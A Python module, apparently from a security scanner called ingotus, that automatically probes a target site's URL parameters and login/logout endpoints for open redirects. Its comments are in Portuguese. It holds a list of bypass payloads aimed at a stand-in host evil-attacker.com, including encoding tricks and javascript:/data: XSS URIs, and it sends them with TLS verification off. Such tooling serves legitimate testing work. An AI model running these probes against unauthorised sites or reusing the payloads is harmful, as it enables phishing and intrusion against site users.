"""
ingotus/core/open_redirect.py

Detecta Open Redirect em parâmetros de URL de forma automática.
Testa parâmetros comuns (?next=, ?redirect=, ?url=, etc.) com múltiplos
payloads de bypass incluindo redirecionamentos absolutos, relativos,
protocol-relative e bypass de validação de domínio.
"""

import re
import urllib.parse
from typing import Optional, List, Dict, Tuple
import requests
from core.config import PROBE_TIMEOUT, USER_AGENT


# Parâmetros comuns que controlam redirecionamento
REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "redirectUrl", "redirectTo",
    "next", "next_url", "nextUrl",
    "return", "return_to", "returnTo", "returnUrl", "return_url",
    "dest", "destination",
    "goto", "go",
    "url", "to", "target",
    "continue", "cont",
    "forward", "location",
    "link", "back",
    "ref", "referer", "referrer",
    "view",
    "callback", "fallback",
    "success", "success_url",
    "logout_redirect", "login_redirect",
    "from", "origin_url",
]

# Payloads de bypass
BYPASS_PAYLOADS = [
    # URL absoluta direta
    "https://evil-attacker.com",
    # Protocol-relative
    "//evil-attacker.com",
    "//evil-attacker.com/path",
    # Bypass de validação de domínio (target.com.evil.com)
    "https://target.com.evil-attacker.com",
    # Barra invertida (bypass de alguns parsers)
    "/\\evil-attacker.com",
    "//\\evil-attacker.com",
    # Encoding
    "https:%2f%2fevil-attacker.com",
    "https:%2F%2Fevil-attacker.com",
    "//%09evil-attacker.com",     # tab encoding
    "//%0aevil-attacker.com",     # newline
    # JavaScript
    "javascript:alert(document.domain)",
    "javascript://evil-attacker.com/%0aalert(1)",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    # Triple slash (alguns browsers)
    "///evil-attacker.com",
    # Sem scheme (alguns parsers adicionam https://)
    "evil-attacker.com",
]

EVIL_DOMAIN = "evil-attacker.com"


def _is_redirect_to_evil(response: requests.Response) -> Tuple[bool, str]:
    """Verifica se a resposta redireciona para o domínio do atacante."""
    if response.status_code in (301, 302, 303, 307, 308):
        location = response.headers.get("Location", "")
        if EVIL_DOMAIN in location or "javascript:" in location.lower():
            return True, location
    return False, ""


def _build_test_urls(base_url: str, param: str, payload: str) -> List[str]:
    """Gera URLs de teste com o parâmetro e payload."""
    parsed = urllib.parse.urlparse(base_url)
    urls = []

    # Adicionar como query param à URL atual
    urls.append(f"{base_url}{'&' if parsed.query else '?'}{param}={urllib.parse.quote(payload, safe=':/')}")

    # Testar também em endpoints comuns de login/logout
    base = f"{parsed.scheme}://{parsed.netloc}"
    for endpoint in ["/login", "/logout", "/auth", "/sso", "/oauth/callback"]:
        urls.append(f"{base}{endpoint}?{param}={urllib.parse.quote(payload, safe=':/')}")

    return urls


def probe_open_redirect(
    base_url: str,
    proxy: Optional[str] = None,
    extra_params: Optional[List[str]] = None,
    max_tests: int = 50,
) -> List[Dict]:
    """
    Testa parâmetros de URL na busca por Open Redirect.

    Args:
        base_url: URL base do alvo (ex: https://example.com)
        proxy: Proxy opcional (ex: http://127.0.0.1:8080)
        extra_params: Parâmetros adicionais extraídos do JS do alvo
        max_tests: Limite máximo de requisições para evitar flood

    Returns:
        Lista de findings com URL vulnerável, parâmetro, payload e severidade.
    """
    findings: List[Dict] = []
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": USER_AGENT}

    params_to_test = REDIRECT_PARAMS.copy()
    if extra_params:
        params_to_test = list(set(params_to_test + extra_params))

    # Payloads prioritários (mais prováveis de funcionar primeiro)
    priority_payloads = [
        "https://evil-attacker.com",
        "//evil-attacker.com",
        "/\\evil-attacker.com",
        "https:%2f%2fevil-attacker.com",
    ]

    tested = 0
    seen_vulns: set = set()

    for param in params_to_test:
        for payload in priority_payloads:
            if tested >= max_tests:
                break

            test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={urllib.parse.quote(payload, safe=':/')}"
            tested += 1

            try:
                r = requests.get(
                    test_url,
                    headers=headers,
                    timeout=PROBE_TIMEOUT,
                    verify=False,
                    allow_redirects=False,
                    proxies=proxies,
                )

                is_vuln, location = _is_redirect_to_evil(r)

                if is_vuln:
                    vuln_key = f"{param}:{payload[:30]}"
                    if vuln_key not in seen_vulns:
                        seen_vulns.add(vuln_key)
                        findings.append({
                            "severity": "MEDIUM",
                            "param": param,
                            "payload": payload,
                            "vuln_url": test_url,
                            "redirect_to": location,
                            "http_status": r.status_code,
                            "desc": f"Open Redirect via parâmetro '{param}'",
                            "evidence": (
                                f"GET {test_url}\n"
                                f"→ HTTP {r.status_code} Location: {location}"
                            ),
                            "poc": test_url,
                        })

            except Exception:
                continue

    # Também testar endpoints de autenticação separados
    parsed = urllib.parse.urlparse(base_url)
    auth_base = f"{parsed.scheme}://{parsed.netloc}"

    auth_endpoints = ["/login", "/logout", "/signin", "/signout", "/auth/callback", "/oauth/authorize"]
    for endpoint in auth_endpoints:
        for param in ["next", "redirect", "return", "url"]:
            for payload in ["https://evil-attacker.com", "//evil-attacker.com"]:
                if tested >= max_tests:
                    break
                test_url = f"{auth_base}{endpoint}?{param}={urllib.parse.quote(payload, safe=':/')}"
                tested += 1
                try:
                    r = requests.get(
                        test_url,
                        headers=headers,
                        timeout=PROBE_TIMEOUT,
                        verify=False,
                        allow_redirects=False,
                        proxies=proxies,
                    )
                    is_vuln, location = _is_redirect_to_evil(r)
                    if is_vuln:
                        vuln_key = f"{endpoint}:{param}:{payload[:20]}"
                        if vuln_key not in seen_vulns:
                            seen_vulns.add(vuln_key)
                            findings.append({
                                "severity": "MEDIUM",
                                "param": param,
                                "payload": payload,
                                "vuln_url": test_url,
                                "redirect_to": location,
                                "http_status": r.status_code,
                                "desc": f"Open Redirect em endpoint de autenticação: {endpoint}?{param}=",
                                "evidence": (
                                    f"GET {test_url}\n"
                                    f"→ HTTP {r.status_code} Location: {location}"
                                ),
                                "poc": test_url,
                            })
                except Exception:
                    continue

    return findings
